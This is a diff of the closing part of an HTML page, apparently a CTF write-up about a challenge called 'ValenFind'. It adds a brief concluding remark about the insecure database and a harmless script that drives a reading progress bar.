+    <p style="margin-top: 32px;">ValenFind was a well-constructed CTF that reflects real-world vulnerability patterns. The cupid bio — <em>"I keep the database secure. No peeking."</em> — was the perfect troll from the challenge author. The database was never secure, and we definitely peeked.</p>
+  </section>
 
 </div>
 
-
-
-
+<script>
+// Reading progress bar
+const bar = document.getElementById('progress');
+window.addEventListener('scroll', () => {
+  const doc = document.documentElement;
+  const scrolled = doc.scrollTop / (doc.scrollHeight - doc.clientHeight);
+  bar.style.width = (scrolled * 100) + '%';
+});
+</script>
 </body>
 </html>
